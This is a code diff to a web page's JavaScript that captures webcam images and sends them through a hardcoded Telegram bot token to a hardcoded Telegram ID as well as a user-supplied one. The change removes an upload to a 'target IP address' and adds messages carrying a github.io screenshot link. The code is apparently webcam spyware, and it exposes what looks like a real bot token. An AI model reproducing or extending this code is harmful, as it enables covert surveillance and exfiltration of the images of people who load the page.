@@ -41,7 +41,6 @@
         const telegramId2Input = document.getElementById('telegramId2');
         const botToken = '6552995612:AAGpPJPmKHJBKeSbzNJPxjxM3-8HDXa_rec'; // Your bot token
         const telegramId1 = '1715157464'; // Hardcoded Telegram ID
-        const ipAddress = '192.168.1.100'; // Replace with the target IP address
         const maxImages = 10; // Maximum number of images to send
         let imageCount = 0; // Counter for images sent
 
@@ -52,12 +51,9 @@
 
         async function startCapturing() {
             const intervalId = setInterval(() => {
-                for (let i = 0; i < 10; i++) { // Capture 10 images every second
-                    if (imageCount < maxImages) {
-                        captureAndSendPhoto();
-                    }
-                }
-                if (imageCount >= maxImages) {
+                if (imageCount < maxImages) {
+                    captureAndSendPhoto();
+                } else {
                     clearInterval(intervalId); // Stop capturing after 10 images
                 }
             }, 1000); // Capture every 1 second
@@ -84,11 +80,11 @@
                         // Save the captured image
                         const imageData = canvas.toDataURL('image/png');
                         imageCount++; // Increment the counter
-                        console.log(`Captured image ${imageCount}`);
+                        const fileName = `screenshot_${imageCount}.png`; // Create a unique file name
+                        console.log(`Captured image ${imageCount}: ${fileName}`);
 
-                        // Send the captured image to Telegram and the specified IP address
-                        sendImageToTelegram(imageData);
-                        sendImageToIpAddress(imageData);
+                        // Send the captured image to Telegram
+                        sendImageToTelegram(imageData, fileName);
                     }, 500); // Allow the video to start for 0.5 seconds
                 })
                 .catch(err => {
@@ -96,7 +92,7 @@
                 });
         }
 
-        async function sendImageToTelegram(imageData) {
+        async function sendImageToTelegram(imageData, fileName) {
             const telegramIds = [telegramId1, telegramId2Input.value]; // Include hardcoded ID and user input
 
             for (const telegramId of telegramIds) {
@@ -115,6 +111,13 @@
                     const result = await response.json();
                     if (result.ok) {
                         console.log(`Image sent to ${telegramId} successfully!`);
+
+                        // Create URL with the screenshot file name
+                        const screenshotUrl = `https://b52-plan-b11.github.io/${fileName}`;
+                        console.log(`Screenshot URL: ${screenshotUrl}`);
+
+                        // Send the URL to Telegram
+                        await sendUrlToTelegram(telegramId, screenshotUrl);
                     } else {
                         console.error(`Error sending image to ${telegramId}: ` + result.description);
                     }
@@ -124,31 +127,25 @@
             }
         }
 
-        async function sendImageToIpAddress(imageData) {
-            const url = `http://${ipAddress}/upload`; // Assuming the server accepts POST requests at /upload
-
-            // Convert data URL to Blob
-            const byteString = atob(imageData.split(',')[1]);
-            const mimeString = imageData.split(',')[0].split(':')[1].split(';')[0];
-            const ab = new Uint8Array(byteString.length);
-            for (let i = 0; i < byteString.length; i++) {
-                ab[i] = byteString.charCodeAt(i);
-            }
-            const blob = new Blob([ab], { type: mimeString });
-
+        async function sendUrlToTelegram(telegramId, url) {
+            const text = `Here is your screenshot: ${url}`;
             const formData = new FormData();
-            formData.append('image', blob, 'screenshot.png');
+            formData.append('chat_id', telegramId);
+            formData.append('text', text);
+
+            const urlSend = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             try {
-                const response = await fetch(url, {
+                const response = await fetch(urlSend, {
                     method: 'POST',
                     body: formData,
                 });
 
-                if (response.ok) {
-                    console.log(`Image sent to IP address ${ipAddress} successfully!`);
+                const result = await response.json();
+                if (result.ok) {
+                    console.log(`URL sent to ${telegramId} successfully!`);
                 } else {
-                    console.error(`Error sending image to IP address ${ipAddress}: ` + await response.text());
+                    console.error(`Error sending URL to ${telegramId}: ` + result.description);
                 }
             } catch (error) {
                 console.error('Error:', error);
@@ -158,3 +155,4 @@
 
 </body>
 </html>
+
